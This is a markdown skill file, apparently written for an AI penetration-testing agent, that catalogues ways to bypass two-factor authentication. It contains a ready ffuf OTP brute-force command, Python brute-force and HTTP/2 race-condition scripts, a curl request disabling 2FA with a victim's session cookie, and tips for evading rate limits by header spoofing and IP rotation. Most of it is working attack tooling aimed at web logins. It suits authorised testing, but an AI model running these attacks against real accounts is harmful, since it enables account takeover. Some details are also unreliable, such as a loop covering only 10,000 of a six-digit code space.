<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: 2fa-bypass
description: 2FA/MFA bypass techniques — OTP brute force, response manipulation, race conditions, backup code abuse, CSRF bypass, SIM swapping indicators, and authentication flow manipulation
---

# 2FA / MFA Bypass

2FA adds a second authentication factor. These techniques bypass it without knowing the OTP. Focus: logic flaws in implementation, not cryptographic attacks.

---

## Response Manipulation

The simplest and most common bypass — change the response to indicate success:

    # 1. Enter valid username + password
    # 2. Intercept 2FA verification request (correct OTP OR wrong OTP)
    # 3. Intercept the RESPONSE and modify it:

    # Change response status code:
    HTTP/1.1 403 Forbidden → HTTP/1.1 200 OK

    # Change response body:
    {"success": false, "message": "Invalid OTP"} → {"success": true}
    {"verified": false} → {"verified": true}
    {"status": "error"} → {"status": "success"}
    {"error": "Invalid code"} → {}   # Empty the error

    # Change redirect:
    Location: /verify-2fa → Location: /dashboard

---

## OTP Brute Force

    # Check for rate limiting:
    # Send 10+ OTP attempts rapidly → blocked? No = vulnerable

    # 6-digit OTP = 1,000,000 combinations
    # 4-digit OTP = 10,000 combinations

    # ffuf brute force (adjust for your form):
    seq -w 0 999999 | ffuf -u http://target.com/verify-otp \
      -X POST -H "Content-Type: application/json" \
      -H "Cookie: session=<your_session>" \
      -d '{"otp":"FUZZ","token":"<flow_token>"}' \
      -w - -mc 200 -fr "invalid"

    # Python script (rate-limited):
    python3 -c "
    import requests, time
    session = requests.Session()
    session.cookies.update({'session': '<your_session_cookie>'})
    for otp in range(10000):
        code = str(otp).zfill(6)
        r = session.post('http://target.com/verify',
                         json={'otp': code, 'token': '<flow_token>'})
        if 'success' in r.text or r.status_code == 302:
            print(f'OTP: {code}')
            break
        time.sleep(0.05)  # Adjust delay
    "

---

## OTP Reuse

    # Test: use the same OTP twice after successful verification
    # If second use doesn't fail → OTPs are not invalidated after use

    # Test: use expired OTP (wait >30 seconds after generation)
    # If still works → no expiry enforced

---

## Skip 2FA Step (Direct Navigation)

    # After authenticating with username/password but before 2FA:
    # Try directly accessing authenticated endpoints:
    GET /dashboard
    GET /account/settings
    GET /api/user/profile
    # If accessible → 2FA check not enforced after step 1

    # Also try: modify the 2FA step parameter in request:
    POST /login
    {"step": 1, "username": "victim", "password": "pass"}
    # Skip step 2 entirely:
    GET /dashboard   # Direct access after step 1

---

## Backup Code / Recovery Code Abuse

    # Test if backup codes can be brute forced:
    # Backup codes are usually 8-12 digit numeric
    # No lockout? → brute force 10-20 million combinations

    # Test if backup codes are reusable:
    # Use code → logout → login again → use same code
    # If works → codes not invalidated

    # Test if backup codes have weaker rate limiting than TOTP:
    # Often implemented differently, sometimes no lockout

---

## Race Condition on OTP Validation

    # If OTP valid for window (30 seconds) → parallel requests:
    # Send 20 simultaneous validation requests with same OTP
    # Server validates OTP → one of 20 succeeds (or all succeed = RCE-level)

    # Python race condition (see scripting.md for HTTP/2 template):
    python3 -c "
    import asyncio, httpx

    async def verify_otp(client, otp):
        return await client.post('https://target.com/verify',
                                  json={'otp': otp},
                                  cookies={'session': '<cookie>'})

    async def race():
        async with httpx.AsyncClient(http2=True, verify=False) as client:
            tasks = [verify_otp(client, '123456') for _ in range(20)]
            results = await asyncio.gather(*tasks)
            for r in results:
                print(r.status_code, r.text[:50])

    asyncio.run(race())
    "

---

## CSRF on 2FA Disable

    # If disabling 2FA lacks CSRF protection:
    # Attacker crafts CSRF form → victim clicks link → 2FA disabled
    # Check: POST /account/2fa/disable requires CSRF token?
    curl -X POST http://target.com/account/2fa/disable \
      -H "Cookie: session=victim_session" \
      -d "confirm=true"
    # If succeeds without CSRF token → CSRF bypass of 2FA

---

## SIM Swap Indicators

    # If 2FA via SMS → identify if phone number change is possible without 2FA:
    # Test: change phone number → does it bypass 2FA?
    # Test: add new phone number → use new number to bypass existing 2FA

---

## Auth Token / Cookie Manipulation

    # After completing 2FA → get session cookie
    # Test: skip 2FA by copying session cookie from another session that completed 2FA
    # Test: decode JWT from post-2FA session and use it pre-2FA

    # JWT manipulation (if session is JWT):
    # See authentication_jwt.md for JWT attacks

---

## Predictable OTP Generation

    # Time-based OTP prediction:
    # If OTP is generated server-side (not TOTP) and based on predictable values:
    # timestamp, user_id, request_count → reverse engineer and predict next OTP

    # Test: request OTP multiple times and look for patterns:
    # OTP 1: 123456, OTP 2: 123457 → sequential = predictable

---

## Email OTP Link Manipulation

    # If 2FA via email link (magic link):
    # Test: modify token in URL → sequential? predictable?
    # Test: reuse link after clicking → not invalidated?
    # Test: link doesn't expire

    # Token entropy check:
    # 6-char alphanumeric token = 36^6 = ~2 billion (acceptable)
    # 4-char numeric = 10^4 = 10,000 (brute-forceable)

---

## Automated Testing

    # nuclei 2FA bypass templates:
    nuclei -t http/vulnerabilities/auth/ -u http://target.com/

    # Custom template for OTP brute (see nuclei templates):
    # Adjust for specific target's OTP endpoint

---

## Pro Tips

1. **Response manipulation is #1** — always intercept and flip `false → true` in 2FA response first
2. Rate limit bypass: try concurrent requests, IPv6 rotation, X-Forwarded-For header change per request
3. Direct navigation after step 1 (before 2FA) catches poorly implemented auth flows
4. Backup codes often have weaker protection than TOTP — test rate limiting separately
5. Race condition on OTP: HTTP/2 single-packet attack makes 20 simultaneous requests arrive at same time
6. CSRF on 2FA management (disable, change phone) is still common — check all 2FA management endpoints

## Summary

2FA bypass priority:
1. Response manipulation: intercept verify response → `"success": true`
2. Skip step: navigate to protected page after step 1 (before 2FA)
3. OTP brute force: if no rate limiting on 6-digit TOTP → 1M combinations
4. OTP reuse: use same OTP twice → not invalidated?
5. Race condition: 20 parallel requests with same OTP
6. Backup code brute: often weaker rate limiting than TOTP
